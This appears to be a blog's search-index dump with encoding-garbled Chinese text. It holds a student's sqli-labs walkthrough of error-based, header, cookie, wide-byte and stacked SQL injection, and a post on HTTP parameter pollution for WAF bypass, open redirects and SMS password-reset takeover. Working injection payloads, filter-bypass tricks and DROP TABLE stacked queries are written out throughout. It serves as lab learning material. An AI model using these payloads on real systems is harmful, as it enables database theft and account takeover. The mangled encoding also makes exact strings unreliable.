æ—¢ç„¶æ˜¯ä¿®æ”¹å¯†ç ï¼Œåç«¯ä¸€å®šå­˜åœ¨updateè¯­å¥ï¼Œä¿®æ”¹çš„æ˜¯passwordï¼ŒçŒœæµ‹ä¼ å…¥çš„passwordå­˜åœ¨å¼•å·é—­åˆ å‘ç°ç¡®å®ä¸º'é—­åˆ ç”¨æŠ¥é”™æ³¨å…¥æŸ¥åº“ï¼ŒæŸ¥è¡¨ï¼ŒæŸ¥åˆ—ï¼ŒæŸ¥æ•°æ® ä½†æ˜¯å½“è¦æŸ¥è¡¨æ—¶å‡ºç°ä¸‹è¿°é—®é¢˜ payloadï¼š 1and updatexml(1, concat(0x7e, (select group_concat(username,id,password) from users)),1) # æŸ¥äº†ä¸€ä¸‹æ‰çŸ¥é“mysqlä¿®æ”¹å’ŒæŸ¥è¯¢ä¸èƒ½æ˜¯åŒä¸€å¼ è¡¨ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¼•å…¥ä¸€ä¸ªä¸´æ—¶è¡¨ payloadï¼š 1and updatexml(1, concat(0x7e, (select group_concat(username,id,password) from (select username,id,password from users) as ikun limit 0,1)),1) # ä½†æ˜¯å½“æˆ‘ä»¬ç”¨limit 1,1æ—¶ï¼Œå‡ºç°äº†é—®é¢˜ï¼Œåæ¥æ‰æ„è¯†åˆ°group_concatæ˜¯å°†æ•°æ®æ”¾åˆ°ä¸€è¡Œè¾“å‡ºï¼Œä¸èƒ½ä¸limitç»“åˆæŸ¥è¯¢ï¼ˆåªèƒ½æŸ¥ä¸€è¡Œ/éƒ¨åˆ†ï¼‰ æˆ‘ä»¬è¿›è€Œç”¨mid payloadï¼š 1and updatexml(1, concat(0x7e, mid((select group_concat(username,id,password) from (select username,id,password from users) as ikun ),1,21)),1)# ä¹Ÿå¯ä»¥ç”¨concat_wsä»£æ›¿group_concat payload: 1 and updatexml(1,concat(0x7e,(select concat_ws(:,username,id,password) from (select username,id,password from users) as ikun limit 1,1)),1)# Less18 åŸºäºuser-agentçš„httpå¤´æ³¨å…¥ ç”¨adminç™»å½•çœ‹åˆ°user-agentçš„å†…å®¹å›æ˜¾åœ¨é¡µé¢ä¸­ å…ˆå°è¯•ç”¨',å‡ºç°æŠ¥é”™ä¿¡æ¯ï¼Œå…¶åŒ…å«ipå’Œç”¨æˆ·åï¼ˆå½“ç„¶ä¹Ÿæœ‰user-agentï¼‰ çŒœæƒ³åœ¨æ•°æ®ä¸­çš„sqlè¯­å¥ä¸ºï¼šINSEERT INTO table VALUES('User-Agent','Ip','Username') (å½“ç„¶æˆ‘ä¹Ÿæ˜¯çœ‹äº†åç«¯ä»£ç æ‰çŸ¥é“çš„ï¼Œå› ä¸ºç¼ºä¹ç»éªŒå“ˆå“ˆå“ˆ) ç”¨')é—­åˆ åŠ ä¸ª#ï¼ŒæŠ¥é”™ä¿¡æ¯æ¶ˆå¤±ï¼Œè¯´æ˜ä¸º')é—­åˆ æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•åœ¨User-Agentçš„ä½ç½®è¿›è¡Œæ³¨å…¥æµ‹è¯•ï¼Œæˆ‘ä»¬ä¿®æ”¹User-Agnetçš„å€¼ä½¿å…¶ç¬¦åˆæ•´ä¸ªINSERT INTIO çš„è¯­æ³• æ„é€ 1',1,1)#å½¢å¼è¿›è¡ŒæŠ¥é”™æ³¨å…¥ payload1ï¼š 1,1,extractvalue(0x0a,concat(0x0a,(select database()))))# ä¹Ÿå¯ä»¥æ„é€ 'and ...and '# payload2: and extractvalue(0x0a,concat(0x0a,(select database()))) and # è§£é‡Šä¸€ä¸‹ä¸Šè¿°paylaod æ’å…¥è¯­å¥ä¸­å˜æˆï¼š and extractvalue(...) and # è¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„å¸ƒå°”è¡¨è¾¾å¼ï¼ŒMySQLä¼šè‡ªåŠ¨å°†å®ƒçš„æœ€ç»ˆå€¼è½¬æ¢ä¸ºÂ·å­—ç¬¦ä¸²æ’å…¥åˆ°è¡¨ä¸­ ''=true extractvalue(...) è¿”å›å­—ç¬¦ä¸²ï¼ˆæˆ‘ä»¬åœ¨ä¹çš„æ˜¯å®ƒä¼šæŠ›å‡ºé”™è¯¯ï¼‰ â€™#'=trueï¼ˆ#ä¸æ˜¯èµ·æ³¨é‡Šä½œç”¨ï¼‰ æœ€ç»ˆå˜æˆï¼š INSERT INTO table VALUES(è¡¨è¾¾å¼ç»“æœ, Ip, Username); Less20 åŸºäºCookieçš„httpå¤´æ³¨å…¥ ç”¨adminç™»å½•åå‡ºç°ä»¥ä¸‹ç•Œé¢ Cookieï¼šuname=admin Cookieè¿™é‡Œå­˜åœ¨æ³¨å…¥ç‚¹ å°è¯•ç”¨'è¿›è¡Œé—­åˆï¼Œå‡ºç°è¯­æ³•æŠ¥é”™ï¼ŒåŠ #åé¡µé¢æ­£å¸¸ï¼Œè¯´æ˜é—­åˆæ–¹å¼ä¸º',çœ‹åˆ°é¡µé¢æœ‰3ä¸ªå¯èƒ½çš„å›æ˜¾ç‚¹ï¼Œæˆ‘å…ˆå°è¯•ä¸€ä¸‹è”åˆæŸ¥è¯¢æ³¨å…¥ å…ˆåˆ¤æ–­å‡ºæœ‰3åˆ— å†æ‰¾å‡ºå›æ˜¾ä½ æœ€åç”¨æ­£å¸¸æ–¹æ³•å³å¯å¾—åˆ°æ•°æ® Less23 æ³¨é‡Šç¬¦å…¨è¢«è¿‡æ»¤æ‰äº† å•å¼•å·é—­åˆæ—¶æŠ¥é”™ åŠ ä¸Šæ³¨é‡Šç¬¦æ—¶æŠ¥é”™æœªæ¶ˆå¤± çŒœæµ‹æ³¨é‡Šç¬¦å¯èƒ½è¢«è¿‡æ»¤æ‰äº†ï¼ˆå°è¯•ç¼–ç ç»•è¿‡ä¹Ÿä¸è¡Œï¼‰ è¿‡æ»¤äº†æ³¨é‡Šç¬¦å¹¶ä¸èƒ½å½±å“æˆ‘ä»¬çš„æ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·åˆ†åˆ«é—­åˆä¸¤ä¾§çš„ Sql æŸ¥è¯¢è¯­å¥ï¼ŒåŒæ—¶éœ€è¦ä½¿ç”¨ OR è¿ç®—ç¬¦åˆ†å‰²å¹¶æ„é€ æ’çœŸè¯­å¥ payloadï¼š ?id=1 or 1=1 æˆåŠŸåŠ›ï¼ è¿™æ ·å°±å¯ä»¥å¼€å§‹æŸ¥è¯¢æ•°æ®åº“äº† payloadï¼š ?id=1and updatexml(1,concat(1,(select database())),1) or 1=1# æˆ–è€…ç”¨and é—­åˆåé¢çš„å¼•å·ä¹Ÿè¡Œ(è¿™é‡Œæ˜¯æŠ¥é”™æ³¨å…¥æ‰€ä»¥å°±ä¸ç”¨å¤ªåœ¨æ„andã€oré€»è¾‘å…³ç³»)?id=1 and extractvalue(1,concat(1,(select database()))) and Less26 è¿‡æ»¤äº†andã€orã€ç©ºæ ¼ã€æ³¨é‡Šç¬¦ andã€orå¯ä»¥é€šè¿‡åŒå†™ç»•è¿‡ï¼Œæ³¨é‡Šç¬¦è¿‡æ»¤ç»•è¿‡å¯ä»¥é€šè¿‡é—­åˆåå¼•å·è§£å†³ æµ‹è¯•é—­åˆæ–¹å¼ï¼ˆè¯·æ•™äº†åœŸè±†å­¦é•¿æ‰çŸ¥é“ï¼‰ å…ˆç”¨ 1anandd1=1 å†ç”¨ 1anandd1=2 è‹¥ç½‘é¡µå›æ˜¾ä¸åŒè¯´æ˜æ˜¯å•å¼•å·é—­åˆ ç©ºæ ¼è¿‡æ»¤æˆ‘å°è¯•äº†urlç¼–ç ã€/**/ç»•è¿‡å‘ç°è¡Œä¸é€š å»ç½‘ä¸Šæ£é¼“ä¸€ç•ªï¼Œæ”¶è·é¢‡ä¸°ï¼ å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å­—ç¬¦æ›¿ä»£ %09(åˆ¶è¡¨ç¬¦), %0a(æ¢è¡Œ), %0b(å‚ç›´åˆ¶è¡¨ç¬¦), %0d(å›è½¦), %a0(ä¸é—´æ–­ç©ºæ ¼)ï¼Œ%0c(æ¢é¡µç¬¦)ï¼Œ%20(ç©ºæ ¼)ï¼Œ/**/(å†…è”æ³¨é‡Š) æˆ‘å‘ç°è¿˜å¯ä»¥ç”¨()è¿›è¡Œç»•è¿‡ payloadï¼š ?id=1anandd(extractvalue(1,concat(1,(select(database())))))oorr1=1 è¿˜æœ‰ä¸ªç¥ä»™åšæ³•ï¼š ç”¨ä½¿ç”¨ â€œ||â€ æ›¿ä»£ â€œorâ€ payloadï¼š ?id=1||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))),1))||1=1 Less27a è¿‡æ»¤äº†selectã€unionã€ç©ºæ ¼ã€æ³¨é‡Šç¬¦ åŒå¼•å·é—­åˆ æ²¡æœ‰è¯­æ³•æŠ¥é”™ï¼Œä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ï¼Œæˆ‘ä»¬é€‰æ‹©è”åˆæŸ¥è¯¢æ³¨å…¥ ç”±äº-è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬é€‰ä¸€ä¸ªè¾ƒå¤§çš„æ•° æ¥ä¸‹å»æ­£å¸¸ç»•è¿‡æŸ¥è¯¢ Less29 å•å¼•å·é—­åˆï¼Œhttpå‚æ•°æ±¡æŸ“ è¿™é‡Œåº”è¯¥æ˜¯æˆ‘çš„é¶åœºå‡ºäº†ç‚¹é—®é¢˜ï¼Œç«Ÿç„¶æ²¡è¿‡æ»¤ï¼ˆéƒ½æ˜¯Protected By The Worldâ€™s Best Firewallï¼Œä½†æ˜¯å¯ä»¥æ­£å¸¸æŸ¥è¯¢ï¼‰ å»çœ‹äº†é¢˜ç›®çš„æºç ï¼Œå‘ç°è¿˜æœ‰login.phpå’Œhacked.phpä»£ç  åªèƒ½æ‰‹åŠ¨è¿›å…¥login.php æµ‹è¯•äº†ä¸‹å•å¼•å·åŒå¼•å·é—­åˆï¼Œéƒ½è·³è½¬åˆ°hacked.php çœ‹äº†ä¸‹login.phpï¼š WAFç™½åå•å‡½æ•°whitelist($input) //WAF implimentation with a whitelist approach..... only allows input to be Numeric.function whitelist($input) $match = preg_match(/^\\d+$/, $input); if($match) //echo you are good; //return $match; else header(Location: hacked.php); //echo you are bad; å…¶ä¸­ï¼š $match = preg_match(/^\\d+$/, $input); /^\\d+$/ çš„å«ä¹‰ï¼š ^ï¼šå­—ç¬¦ä¸²å¼€å¤´ \\d+ï¼šè‡³å°‘ä¸€ä¸ªæ•°å­— $ï¼šå­—ç¬¦ä¸²ç»“å°¾ æ•´ä¸ªæ­£åˆ™è¦æ±‚ è¾“å…¥å¿…é¡»æ˜¯å…¨æ•°å­—ç»„æˆ header(Location: hacked.php) é‡å®šå‘åˆ°hacked.php HTTP å‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰ è¡Œä¸ºæ¨¡æ‹Ÿ java_implimentation($query_string) // The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).function java_implimentation($query_string) $q_s = $query_string; $qs_array= explode(,$q_s); foreach($qs_array as $key = $value) $val=substr($value,0,2); if($val==id) $id_value=substr($value,3,30); return $id_value; echo br; break; è¯¥æ–¹æ³•å°† GET è¯»å…¥çš„æ•´è¡Œå‚æ•°ä½¿ç”¨ explode() æ–¹æ³•å¯¹ â€œâ€ è¿›è¡Œåˆ†å‰²ï¼Œè¿”å›ä¸€ä¸ªåˆ†å‰²åçš„æ•°ç»„ã€‚æ¥ç€æ–¹æ³•é€šè¿‡ substr() æ–¹æ³•æå–å¯¹ â€œâ€ åˆ†å‰²åçš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å‰ 2 ä¸ªå­—ç¬¦ï¼Œè‹¥è¿™ 2 ä¸ªå­—ç¬¦æ˜¯ â€œidâ€ï¼Œåˆ™å†æ¬¡ä½¿ç”¨ substr() æ–¹æ³•æå–ç­‰å·åé¢çš„å€¼è¿”å›ã€‚æ³¨æ„è¯¥æ–¹æ³•æå–çš„æ˜¯ 2 ä¸ªåŒåå˜é‡ä¸­çš„ç¬¬ä¸€ä¸ªï¼Œå› æ­¤å®ƒæ— æ³•å¯¹ç¬¬äºŒä¸ªåŒåå˜é‡è¿›è¡Œæ“ä½œ ç»“åˆç½‘é¡µç»™çš„pdf(è¿™ä¸ªæˆ‘æ‰“ä¸å¼€ï¼Œå«–äº†ä¸€ä¸‹åœŸè±†å“¥çš„) å¯ä»¥çœ‹åˆ°æ­å»ºåœ¨apacheæœåŠ¡å™¨ä¸Šçš„phpæœåŠ¡å¯¹äºä¼ å…¥å¤šä¸ªç›¸åŒåå­—çš„å‚æ•°ï¼ŒæœåŠ¡å™¨åªè§£ææœ€åä¸€ä¸ªï¼Œç”±äºæ³¨å…¥ 2 ä¸ªåŒåå‚æ•°æ—¶ï¼Œjava_implimentation() æ–¹æ³•è¿”å›çš„å‚æ•°æ˜¯ç¬¬ä¸€ä¸ª id å‚æ•°ï¼Œæ­¤æ—¶è¿™ä¸ªè¿‡æ»¤å°±è¢«æˆ‘ä»¬ç»•è¿‡äº†ï¼Œæ‰€ä»¥$_GET['id']å˜é‡å®é™…ä¸Šæ˜¯æœ€åä¸€ä¸ªidå‚æ•° æ€»ç»“ï¼š 1.å…¨æ•°å­—è¾“å…¥æ‰èƒ½ç»•è¿‡WAF 2.æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥ä¸¤ä¸ªåŒåçš„å‚æ•° idï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç”¨äºç»•è¿‡ WAFï¼Œç¬¬äºŒä¸ªå‚æ•°ç”¨äºæ³¨å…¥ payloadï¼š ?id=1id=-1union select 1,2,3--+ Less32 å®½å­—èŠ‚æ³¨å…¥ è¾“å…¥'å‘ç°å…¶è¢«è½¬ä¹‰ æŸ¥çœ‹æºç ï¼š function check_addslashes($string) $string = preg_replace(/. preg_quote(\\\\) ./, \\\\\\\\\\\\, $string); //escape any backslash $string = preg_replace(/\\/i, \\\\\\, $string); //escape single quote with a backslash $string = preg_replace(/\\/, \\\\\\, $string); //escape double quote with a backsla return $string; è¯¥å‡½æ•°ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å­—ç¬¦ï¼Œå°† ' è½¬ä¹‰ä¸º \\' ï¼Œ å°† \\ è½¬ä¹‰ä¸º \\\\ ï¼Œå°† è½¬ä¹‰ä¸º \\ åœ¨Less36ä¸­é‡‡å–ï¼š function check_quotes($string) $string = mysql_real_escape_string($string); return $string; ä½¿ç”¨mysql_real_escape_string()å‡½æ•°æ¥è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ å¯¹äºä¸€èˆ¬çš„è½¬ä¹‰å­—ç¬¦ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•æ„é€ æ³¨å…¥çš„ payload çš„ï¼Œé€šå¸¸æƒ…å†µä¸‹ä¸å­˜åœ¨SQLæ³¨å…¥ï¼Œä½†è¿™å¹¶ä¸ä»£è¡¨ç½‘é¡µå°±æ²¡æœ‰ä»»ä½•æ¼æ´å¯ä»¥æ³¨å…¥ æˆ‘ä»¬æ³¨æ„åˆ°æ•°æ®åº“é‡‡ç”¨gbkç¼–ç ï¼š mysql_query(SET NAMES gbk);$sql=SELECT * FROM users WHERE id=$id LIMIT 0,1;$result=mysql_query($sql); è¿™é‡Œå°è¯•é‡‡ç”¨å®½å­—èŠ‚æ³¨å…¥ï¼š æ•°æ®åº“çš„ç¼–ç é‡‡ç”¨ GBK å›½æ ‡ç æ—¶ï¼Œè™½ç„¶å•å¼•å·è¿˜æ˜¯ä¼šåŠ ä¸Šåæ–œæ ä»è€Œè¢«è½¬ä¹‰ï¼Œä½†æ˜¯ â€œ%dfâ€ ä¼šå’Œåæ–œæ çš„ URL ç¼–ç  â€œ%5Câ€ é—­åˆï¼Œä»è€Œæ„æˆ GBK å›½æ ‡ç ä¸­çš„æ±‰å­—â€œé€£â€ï¼Œä½¿å¾—ç”¨äºè½¬ä¹‰çš„åæ–œæ è¢«æˆ‘ä»¬â€œåƒæ‰â€äº† è¾“å…¥%df'æ—¶æˆåŠŸè¿”å›é”™è¯¯ä¿¡æ¯ï¼ŒåŠ --+é¡µé¢æ­£å¸¸ï¼Œç»•è¿‡æˆåŠŸ æˆ‘ä»¬é‡‡ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼š ä¸è¦ä½¿ç”¨å•å¼•å·æ¥é—­åˆå­—ç¬¦ä¸²ï¼Œæ”¹ç”¨åå…­è¿›åˆ¶ (HEX) ç¼–ç ï¼ˆç½‘é¡µæœ‰æç¤ºï¼‰æ›¿ä»£æ‰€éœ€æ•°æ®åº“åã€è¡¨å å¦‚ä»¥ä¸‹ä½¿ç”¨0x7365637572697479æ›¿ä»£security Less38 å•å¼•å·é—­åˆï¼Œè¿™é¢˜ä¸»è¦ç”¨æ¥æµ‹è¯•å †å æ³¨å…¥ åœ¨æºç ä¸­å‘ç°ï¼š mysqli_multi_query($con1, $sql) è¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œå¤šä¸ª MySQL è¯­å¥ã€‚ä¹‹å‰çš„ Less ä½¿ç”¨çš„æ˜¯ mysql_query() å‡½æ•°ï¼Œåªæ‰§è¡Œä¸€æ¡ MySQL æŸ¥è¯¢ æ’å…¥æ–°ç”¨æˆ·ikunï¼š æŸ¥è¯¢idä¸º999çš„ç”¨æˆ·ï¼š å †å æ³¨å…¥ï¼š ?id=1;CREATE TABLE WhiteMoon LIKE users;--+?id=1;INSERT INTO WhiteMoon SELECT * FROM users;--+?id=1;DELETE FROM WhiteMoon;--+?id=1;DROP TABLE WhiteMoon;--+","tags":["æ¼æ´","SQL","CTF","é¶åœº"],"categories":["CTF","é¶åœº"]},{"title":"HTTPå‚æ•°æ±¡æŸ“","path":"/2025/07/21/HTTPå‚æ•°æ±¡æŸ“/","content":"HTTPå‚æ•°æ±¡æŸ“ åœ¨åˆ·sqli-labs 29æ—¶é‡åˆ°äº†httpå‚æ•°æ±¡æŸ“ï¼Œå°±æƒ³ç€è¶ç«æ‰“åŠ«æ¥å­¦ä¹ ä¸€ä¸‹ HTTP Parameter Pollutionï¼Œç®€ç§°HPPï¼Œæ˜¯ä¸€ç§æ³¨å…¥å‹æ¼æ´ï¼Œå¦‚æœWebåº”ç”¨ä¸­å­˜åœ¨è¿™æ ·çš„æ¼æ´ï¼Œå¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨æ¥è¿›è¡Œå®¢æˆ·ç«¯æˆ–è€…æœåŠ¡å™¨ç«¯çš„æ”»å‡»ï¼Œé€šè¿‡ HPP å‚æ•°æ±¡æŸ“å¯ä»¥å®ç°ç»•è¿‡ waf æ¥è¿›è¡Œæ”»å‡» æ¼æ´åŸç† æµè§ˆå™¨ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’æ—¶ï¼Œæµè§ˆå™¨æäº¤ GET/POST è¯·æ±‚å‚æ•°ï¼Œè¿™äº›å‚æ•°ä¼šä»¥ â€œåç§°-å€¼å¯¹â€ çš„å½¢å¼å‡ºç°ã€‚é€šå¸¸åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­ï¼ŒåŒæ ·åç§°çš„å‚æ•°åªä¼šå‡ºç°ä¸€æ¬¡ï¼Œä½†æ˜¯åœ¨ HTTP åè®®ä¸­æ˜¯å…è®¸åŒæ ·åç§°çš„å‚æ•°å‡ºç°å¤šæ¬¡çš„ ä½†ä¸åŒæœåŠ¡å™¨å¤„ç†æ–¹å¼ä¼šä¸ä¸€æ · å¦‚Gooleå’ŒBingçš„ä¾‹å­ï¼š Gooleå°†ä¸¤æ¬¡è¾“å…¥çš„å‚æ•°å€¼è¿›è¡Œæ‹¼æ¥ï¼ˆæœªè¦†ç›–ï¼‰ Bingå°†ç¬¬äºŒæ¬¡è¾“å…¥è¦†ç›–ç¬¬ä¸€æ¬¡è¾“å…¥ è¦†ç›–æ–¹å¼ WAFç»•è¿‡ HPPå…¶å®ä¸¥æ ¼æ„ä¹‰ä¸Šè®²å¹¶ä¸å±äºä¸€ç§æ¼æ´ï¼Œå®ƒæ˜¯åˆ©ç”¨äº†ä¸åŒæœåŠ¡å™¨å¯¹äºå‚æ•°è·å–çš„ç»“æœä¸åŒè€Œå¯¼è‡´äº†å¯ä»¥åˆ©ç”¨æŸäº›æ¼æ´ã€‚HPPçš„ç‰¹æ€§è®©å®ƒåœ¨ WAF ç»•è¿‡ã€é€»è¾‘æ¼æ´æŒ–æ˜ä¸Šå…·æœ‰å¥‡æ•ˆ SQLç»•è¿‡ å¦‚ï¼š ?id=1id=-1 union select 1,2,database()?id=-1id=%20union%20id=select%201,2id=,database() XSSç»•è¿‡ï¼ˆå¾…ï¼‰ æ–‡ä»¶ä¸Šä¼ ï¼ˆå¾…ï¼‰ é€»è¾‘æ¼æ´ HPP å‚æ•°æ±¡æŸ“åœ¨é€»è¾‘æ¼æ´æŒ–æ˜ä¸­ä¹Ÿæ˜¯ä¸€ä¸ªå¤§æ€å™¨ ä»»æ„URLè·³è½¬ https://www.example.com?u=https://hackun.com ï¼Œç”±äºåç«¯åšäº†é™åˆ¶ï¼Œå½“æˆ‘ä»¬æŠŠu æ”¹æˆåˆ«çš„ä¸åŒæºçš„åŸŸå(å¦‚https://ikunmma.com)æ—¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨HPPï¼Œå°†è¯·æ±‚åœ°å€å˜æˆhttps://www.example.com?u=https://hackun.comu=https://ikunmma.com æ—¶ï¼Œç”±äºæœåŠ¡å™¨é€»è¾‘é”™è¯¯ ä½¿ç”¨ç¬¬ä¸€ä¸ªuåšæ ¡éªŒå‚æ•°ï¼Œè€Œç¬¬äºŒä¸ªuå‚æ•°åšè·³è½¬ç›®çš„åœ°å€ã€‚äºæ˜¯è¿™æ ·ä¾¿å¯æˆåŠŸç»•è¿‡é™åˆ¶ï¼Œå½¢æˆä»»æ„ URL è·³è½¬ ä»»æ„å¯†ç é‡ç½®ï¼ˆçŸ­ä¿¡çˆ†ç ´ï¼‰ ä¸€èˆ¬é‡ç½®å¯†ç çš„æ—¶å€™ï¼Œä¼šå‘é€çŸ­ä¿¡åˆ°ç”¨æˆ·æ‰‹æœº æ¯”å¦‚GET/POSTä¼ é€’çš„å‚æ•°ä¸ºï¼šphone=13888888888 æˆ‘ä»¬ä¸€èˆ¬ä¼šå»æƒ³ï¼Œèƒ½ä¸èƒ½å‘é€éªŒè¯ç åˆ°è‡ªå·±çš„æ‰‹æœºï¼Œäºæ˜¯å¯ä»¥æ„é€ æˆï¼š phone=13888888888,12345678901 æˆ–è€… phone=13888888888;12345678901 æˆ–è€… phone=13888888888,12345678901 ç­‰ç­‰ä¸€äº›æƒ…å†µï¼Œæœ‰æ—¶å€™èƒ½é€šè¿‡ï¼Œä½†æ˜¯æœ‰äº›æ—¶å€™ä¼šå‡ºç° å·ç ä¸åˆæ³• çš„æƒ…å†µï¼Œæ­¤æ—¶ä¾¿å¯ä»¥è€ƒè™‘åˆ©ç”¨ HPP â€”â€” phone=13888888888phone=12345678901ï¼Œå¦‚æœæ°å¥½æœåŠ¡å™¨ç”¨ç¬¬ä¸€ä¸ªå·ç éªŒè¯æ˜¯å¦å­˜åœ¨è¯¥ç”¨æˆ·ï¼Œè€Œä½¿ç”¨ç¬¬äºŒä¸ªå·ç å‘é€çŸ­ä¿¡æ—¶ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æ¥ç®¡è¯¥ç”¨æˆ· é˜²å¾¡ è®¾å¤‡å±‚é¢ï¼Œè®©WAFæˆ–å…¶ä»–ç½‘å…³è®¾å¤‡ï¼ˆæ¯”å¦‚IPSï¼‰åœ¨æ£€æŸ¥URLæ—¶ï¼Œå¯¹åŒä¸€ä¸ªå‚æ•°è¢«å¤šæ¬¡èµ‹å€¼çš„æƒ…å†µè¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚ç”±äºHTTPåè®®å…è®¸ç›¸åŒå‚æ•°åœ¨URLä¸­å¤šæ¬¡å‡ºç°ï¼Œå› æ­¤è¿™ç§ç‰¹æ®Šå¤„ç†éœ€è¦æ³¨æ„é¿å…è¯¯æ€çš„æƒ…å†µï¼› ä»£ç å±‚é¢ï¼Œç¼–å†™WEBç¨‹åºæ—¶ï¼Œè¦é€šè¿‡åˆç†çš„$_GETæ–¹æ³•è·å–URLä¸­çš„å‚æ•°å€¼ï¼Œè€Œå°è¯•è·å– WebæœåŠ¡å™¨è¿”å›ç»™ç¨‹åºçš„å…¶ä»–å€¼æ—¶è¦æ…é‡å¤„ç†ï¼Œç»“åˆå…¶ä»–æ¼æ´çš„äº§ç”Ÿè¿›è¡Œç»„åˆæ’æŸ¥ ä¾‹é¢˜ sqli-labs 29 å•å¼•å·é—­åˆï¼Œhttpå‚æ•°æ±¡æŸ“ è¿™é‡Œåº”è¯¥æ˜¯æˆ‘çš„é¶åœºå‡ºäº†ç‚¹é—®é¢˜ï¼Œç«Ÿç„¶æ²¡è¿‡æ»¤ï¼ˆéƒ½æ˜¯Protected By The Worldâ€™s Best Firewallï¼Œä½†æ˜¯å¯ä»¥æ­£å¸¸æŸ¥è¯¢ï¼‰ å»çœ‹äº†é¢˜ç›®çš„æºç ï¼Œå‘ç°è¿˜æœ‰login.phpå’Œhacked.phpä»£ç  åªèƒ½æ‰‹åŠ¨è¿›å…¥login.php æµ‹è¯•äº†ä¸‹å•å¼•å·åŒå¼•å·é—­åˆï¼Œéƒ½è·³è½¬åˆ°hacked.php çœ‹äº†ä¸‹login.phpï¼š WAFç™½åå•å‡½æ•°whitelist($input) //WAF implimentation with a whitelist approach..... only allows input to be Numeric.function whitelist($input) $match = preg_match(/^\\d+$/, $input); if($match) //echo you are good; //return $match; else header(Location: hacked.php); //echo you are bad; å…¶ä¸­ï¼š $match = preg_match(/^\\d+$/, $input); /^\\d+$/ çš„å«ä¹‰ï¼š ^ï¼šå­—ç¬¦ä¸²å¼€å¤´ \\d+ï¼šè‡³å°‘ä¸€ä¸ªæ•°å­— $ï¼šå­—ç¬¦ä¸²ç»“å°¾ æ•´ä¸ªæ­£åˆ™è¦æ±‚ è¾“å…¥å¿…é¡»æ˜¯å…¨æ•°å­—ç»„æˆ header(Location: hacked.php) é‡å®šå‘åˆ°hacked.php HTTP å‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰ è¡Œä¸ºæ¨¡æ‹Ÿ java_implimentation($query_string) // The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).function java_implimentation($query_string) $q_s = $query_string; $qs_array= explode(,$q_s); foreach($qs_array as $key = $value) $val=substr($value,0,2); if($val==id) $id_value=substr($value,3,30); return $id_value; echo br; break; è¯¥æ–¹æ³•å°† GET è¯»å…¥çš„æ•´è¡Œå‚æ•°ä½¿ç”¨ explode() æ–¹æ³•å¯¹ â€œâ€ è¿›è¡Œåˆ†å‰²ï¼Œè¿”å›ä¸€ä¸ªåˆ†å‰²åçš„æ•°ç»„ã€‚æ¥ç€æ–¹æ³•é€šè¿‡ substr() æ–¹æ³•æå–å¯¹ â€œâ€ åˆ†å‰²åçš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å‰ 2 ä¸ªå­—ç¬¦ï¼Œè‹¥è¿™ 2 ä¸ªå­—ç¬¦æ˜¯ â€œidâ€ï¼Œåˆ™å†æ¬¡ä½¿ç”¨ substr() æ–¹æ³•æå–ç­‰å·åé¢çš„å€¼è¿”å›ã€‚æ³¨æ„è¯¥æ–¹æ³•æå–çš„æ˜¯ 2 ä¸ªåŒåå˜é‡ä¸­çš„ç¬¬ä¸€ä¸ªï¼Œå› æ­¤å®ƒæ— æ³•å¯¹ç¬¬äºŒä¸ªåŒåå˜é‡è¿›è¡Œæ“ä½œ æ­å»ºåœ¨apacheæœåŠ¡å™¨ä¸Šçš„phpæœåŠ¡å¯¹äºä¼ å…¥å¤šä¸ªç›¸åŒåå­—çš„å‚æ•°ï¼ŒæœåŠ¡å™¨åªè§£ææœ€åä¸€ä¸ªï¼Œç”±äºæ³¨å…¥ 2 ä¸ªåŒåå‚æ•°æ—¶ï¼Œjava_implimentation() æ–¹æ³•è¿”å›çš„å‚æ•°æ˜¯ç¬¬ä¸€ä¸ª id å‚æ•°ï¼Œæ­¤æ—¶è¿™ä¸ªè¿‡æ»¤å°±è¢«æˆ‘ä»¬ç»•è¿‡äº†ï¼Œæ‰€ä»¥$_GET['id']å˜é‡å®é™…ä¸Šæ˜¯æœ€åä¸€ä¸ªidå‚æ•° æ€»ç»“ï¼š 1.å…¨æ•°å­—è¾“å…¥æ‰èƒ½ç»•è¿‡WAF 2.æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥ä¸¤ä¸ªåŒåçš„å‚æ•° idï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç”¨äºç»•è¿‡ WAFï¼Œç¬¬äºŒä¸ªå‚æ•°ç”¨äºæ³¨å…¥ payloadï¼š ?id=1id=-1union select 1,2,3--+ å‚è€ƒï¼š HTTPå‚æ•°æ±¡æŸ“å­¦ä¹  Bypass WAFä¹‹HTTPå‚æ•°æ±¡æŸ“(HPP)æ¼æ´æŒ–æ˜","tags":["æ¼æ´","HTTP"],"categories":["æ¼æ´","HTTP"]},{"title":"åˆæ¢Docker","path":"/2025/07/17/åˆæ¢Docker/","content":"å¹´å°‘ä¸çŸ¥dockeréš¾ï¼Œåˆå­¦å·²æ˜¯dockeräºº 